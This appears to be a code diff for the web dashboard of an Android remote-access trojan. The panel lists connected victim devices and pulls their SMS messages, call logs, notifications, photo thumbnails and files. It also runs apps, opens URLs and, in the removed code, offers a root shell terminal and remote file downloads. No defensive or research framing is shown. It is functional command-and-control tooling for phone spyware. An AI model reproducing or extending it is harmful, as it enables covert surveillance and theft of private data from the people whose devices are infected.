+                const files = data.gallery?.files || [];
+                body.innerHTML = `<div class="gallery-grid">${files.map(f => `<div class="gallery-item"><img src="data:image/jpeg;base64,${f.thumbnail}"/><p>${f.name}</p></div>`).join('')}</div>`;
+                footer.innerHTML = `<button onclick="sendCommand('gallery back')">◀ Prev</button><span>page ${data.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next ▶</button>`;
+            }
+            else if (currentModal === 'toast') {
+                body.innerHTML = '<p>Enter toast message:</p><input id="toast-text" placeholder="say something..."/><br>';
+                footer.innerHTML = `<button onclick="sendToast()">Show Toast</button><button onclick="sendCommand('toast off')">Hide</button>`;
+            }
+            else if (currentModal === 'openurl') {
+                body.innerHTML = '<p>URL:</p><input id="url-text" value="https://" /><br>';
+                footer.innerHTML = `<button onclick="sendOpenUrl()">OPEN</button>`;
+            }
+            else if (currentModal === 'sms') {
+                const logs = data.sms_logs || [];
+                body.innerHTML = `<table><tr><th>sender</th><th>msg</th></tr>${logs.map(l => `<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
+            }
+            else if (currentModal === 'calls') {
+                const calls = data.call_logs || [];
+                body.innerHTML = `<table><tr><th>number</th><th>duration</th></tr>${calls.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds}s</td></tr>`).join('')}</table>`;
+            }
+            else if (currentModal === 'filemanager') {
+                const fm = data.file_manager || { path: '/', files: [] };
+                let html = `<p>path: ${fm.path}</p><table>`;
+                html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..')">📁 .. (up)</a></td></tr>`;
+                fm.files.forEach(f => {
+                    if (f.isDirectory) html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}')">📁 ${f.name}</a></td><td></td></tr>`;
+                    else html += `<tr><td>📄 ${f.name}</td><td><button class="grid-item" onclick="sendCommand('get ${f.name}')">⬇️</button></td></tr>`;
+                });
+                body.innerHTML = html + '</table>';
+                footer.innerHTML = `<input placeholder="new name" id="fm-input"><button onclick="handleFmAction('rename')">Rename</button>`;
+            }
+            else if (currentModal === 'notifications') {
+                const notifs = data.notifications || [];
+                body.innerHTML = `<table><tr><th>app</th><th>text</th></tr>${notifs.map(n => `<tr><td>${n.packageName}</td><td>${n.title} · ${n.text}</td></tr>`).join('')}</table>`;
+            }
+            else if (currentModal === 'apps') {
+                const apps = data.apps || [];
+                body.innerHTML = `<table><tr><th>app</th><th>action</th></tr>${apps.map(a => `<tr><td>${a.appName}</td><td><button onclick="sendCommand('run ${a.packageName}')">run</button></td></tr>`).join('')}</table>`;
+            }
         }
-    }
 
-    // --- MODAL CONTROLLER ---
-    function openModal(type) {
-        currentModalType = type;
-        modalOutput.innerHTML = '<span style="color:#0f0;">[sys] Channel opened... waiting for output...</span>\n';
-        modal.style.display = 'flex';
+        window.sendToast = () => { const t = document.getElementById('toast-text')?.value; if(t) sendCommand(`toast on ${t}`); };
+        window.sendOpenUrl = () => { const u = document.getElementById('url-text')?.value; if(u) sendCommand(`openurl ${u}`); };
+        window.handleFmAction = (act) => {
+            if (act === 'rename') {
+                const name = prompt('file to rename?');
+                if (name && document.getElementById('fm-input')?.value) sendCommand(`rename ${name} ${document.getElementById('fm-input').value}`);
+            }
+        };
 
-        if (type === 'terminal') {
-            modalTitle.innerText = '> ROOT TERMINAL [shell]';
-            modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="ls, pwd, whoami ..." autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
-                <button onclick="sendCommand()">EXECUTE</button>
-            `;
-            cmd('shell');
-        }
-        else if (type === 'filemanager') {
-            modalTitle.innerText = '> FILE MANAGER (remote fs)';
-            modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="ls, cd folder, rm file, get file, upload file" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
-                <button onclick="sendCommand()">RUN</button>
-            `;
-            cmd('shell');
-            setTimeout(() => cmd('ls'), 500);
-        }
-        else if (type === 'apps') {
-            modalTitle.innerText = '> APPLICATIONS (list & run)';
-            modalFooter.innerHTML = `
-                <input type="text" id="modalInput" placeholder="run com.whatsapp.name" autocomplete="off" onkeypress="if(event.key === 'Enter') sendCommand()">
-                <button onclick="sendCommand()">EXECUTE</button>
-                <button onclick="cmd('list_app')" style="background:#005500;">⟳ LIST APPS</button>
-            `;
-            cmd('list_app');
-        }
-        else if (type === 'sms') {
-            modalTitle.innerText = '> SMS INBOX';
-            modalFooter.innerHTML = `<button onclick="cmd('getsms')" style="width:100%;">🔄 REFRESH SMS</button>`;
-            cmd('getsms');
-        }
-        else if (type === 'calls') {
-            modalTitle.innerText = '> CALL LOGS';
-            modalFooter.innerHTML = `<button onclick="cmd('getcalllogs')" style="width:100%;">🔄 REFRESH CALLS</button>`;
-            cmd('getcalllogs');
-        }
-        
-        // Focus the input immediately
-        setTimeout(() => {
-            const inp = document.getElementById('modalInput');
-            if(inp) inp.focus();
-        }, 100);
-    }
-
-    function closeModal() {
-        if (currentModalType === 'terminal' || currentModalType === 'filemanager') {
-            cmd('exit');
-            setTimeout(() => cmd('exit_shell'), 300);
-        }
-        modal.style.display = 'none';
-        currentModalType = null;
-    }
-
-    function sendCommand() {
-        const inputField = document.getElementById('modalInput');
-        if (!inputField) return;
-        const val = inputField.value.trim();
-        if (val === '') return;
-
-        if (currentModalType === 'filemanager' && val.startsWith('get ')) {
-            modalOutput.innerHTML += `\n<span style="color:#5ff0ff;">[⇣] initiating download: ${val} ... Watch your server directory!</span>\n`;
-        }
-        
-        cmd(val);
-        inputField.value = '';
-    }
-
-    // --- POLLING & STATE UPDATES ---
-    setInterval(() => {
-        fetch('/api/status')
-            .then(r => r.json())
-            .then(data => {
-                const statusEl = document.getElementById('status');
-                const ipSpan = document.getElementById('info-ip');
-                const deviceSpan = document.getElementById('info-device');
-
-                if (data.connected) {
-                    statusEl.innerText = `ONLINE ${data.address?.[0] || ''}`;
-                    statusEl.className = 'status-badge online';
-                    ipSpan.innerText = data.address ? `${data.address[0]}:${data.address[1]}` : 'unknown';
-                } else {
-                    statusEl.innerText = 'OFFLINE';
-                    statusEl.className = 'status-badge offline';
-                    ipSpan.innerText = '--.--.--.--';
-                }
-
-                if (data.logs) {
-                    // Update header if [INFO] is found
-                    for (let line of data.logs) {
-                        if (line.includes('[INFO]')) {
-                            deviceSpan.innerText = line.split('[INFO]')[1].trim();
-                        }
+        // polling
+        async function pollStatus() {
+            try {
+                const res = await fetch('/api/status');
+                state = await res.json();
+                updateDeviceList();
+                for (const dev of state.devices) {
+                    const dres = await fetch(`/api/client_data/${dev.id}`);
+                    const cdata = await dres.json();
+                    clientDataCache[dev.id] = cdata;
+                    if (dev.id === selectedClientId && currentModal) renderModalContent();
+                    // popup notif
+                    if (dev.id === selectedClientId && cdata.agent_messages?.length) {
+                        const msg = cdata.agent_messages[0];
+                        const h = dev.id+msg;
+                        if (!agentMessageHashes.has(h)) { showPopup('info', msg); agentMessageHashes.add(h); }
                     }
-
-                    // Only append NEW logs to the active modal
-                    if (currentModalType && data.logs.length > lastLogCount) {
-                        const newLogs = data.logs.slice(lastLogCount);
-                        let formatted = '';
-                        newLogs.forEach(l => {
-                            if (l.includes('[ERROR]')) formatted += `<span style="color:#ff5f5f;">${l}</span>\n`;
-                            else if (l.includes('[SMS]') || l.includes('SMS:')) formatted += `<span style="color:#f5e56b;">${l}</span>\n`;
-                            else if (l.includes('[DOWNLOAD]')) formatted += `<span style="color:#5ff0ff;">${l}</span>\n`;
-                            else formatted += l + '\n';
-                        });
-                        
-                        let isScrolledToBottom = modalOutput.scrollHeight - modalOutput.clientHeight <= modalOutput.scrollTop + 5;
-                        modalOutput.innerHTML += formatted;
-                        if(isScrolledToBottom) modalOutput.scrollTop = modalOutput.scrollHeight;
-                    }
-                    lastLogCount = data.logs.length;
                 }
-            })
-            .catch(() => {});
-    }, 1200);
+            } catch (e) { document.getElementById('connection-status').innerHTML = 'ERR'; }
+            setTimeout(pollStatus, 2800);
+        }
 
-    // Close modal if user clicks outside of the window box
-    window.onclick = function(e) {
-        if (e.target === modal) closeModal();
-    };
-
-</script>
+        window.onload = () => { pollStatus(); };
+        window.onclick = (e) => { const m = document.getElementById('main-modal'); if (e.target === m) closeModal(); };
+    </script>
 </body>
 </html>
